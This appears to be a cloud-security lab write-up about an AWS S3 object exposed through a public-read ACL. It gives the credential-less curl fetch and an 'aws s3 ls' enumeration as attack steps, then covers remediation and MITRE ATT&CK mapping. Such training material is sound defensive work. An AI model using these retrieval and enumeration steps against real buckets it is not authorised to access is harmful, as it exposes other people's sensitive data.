# S3 Object ACL — Public Read Without Credentials

**Provider:** AWS | **Category:** Storage / Misconfiguration

## Scenario

A developer enabled **object-level ACLs** on an S3 bucket and accidentally set a
`public-read` ACL on a file containing sensitive data. The bucket itself blocks
public bucket policies, giving a false sense of security — but object-level ACLs
bypass this control and make the individual object directly accessible over HTTPS.

No AWS credentials are required to retrieve the file.

## Attack Path

```
[Attacker] No credentials required
    |
    v
Enumerate bucket contents (or guess key prefix)
    |
    v
curl https://<bucket>.s3.eu-west-1.amazonaws.com/public/release-notes.txt
    |
    v
HTTP 200  -->  flag in response body
```

### Step 1 — Direct fetch (URL from lab output)

```bash
BUCKET="<bucket_name>"

curl -s "https://${BUCKET}.s3.eu-west-1.amazonaws.com/public/release-notes.txt"
```

### Step 2 — Enumerate all objects (with attacker credentials, if any)

```bash
aws s3 ls "s3://${BUCKET}/" --recursive --profile attacker
```

## How to Fix in Production

1. **Enable `BlockPublicAcls = true`** on all S3 buckets — this prevents any object
   from having a public ACL regardless of what is set at object creation time.
2. **Enable all four S3 Block Public Access settings** at the account level:
   ```bash
   aws s3control put-public-access-block \
     --account-id <account-id> \
     --public-access-block-configuration \
       BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
   ```
3. **Use bucket policies instead of ACLs** for access control — ACLs are a legacy
   mechanism and AWS recommends disabling them (`ObjectOwnership: BucketOwnerEnforced`).
4. **Audit public objects** regularly:
   ```bash
   aws s3api list-objects-v2 --bucket <bucket> \
     --query "Contents[*].Key" --output text | \
     xargs -I{} aws s3api get-object-acl --bucket <bucket> --key {}
   ```

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Data from Cloud Storage | [T1530](https://attack.mitre.org/techniques/T1530/) |
| Cloud Storage Object Discovery | [T1619](https://attack.mitre.org/techniques/T1619/) |
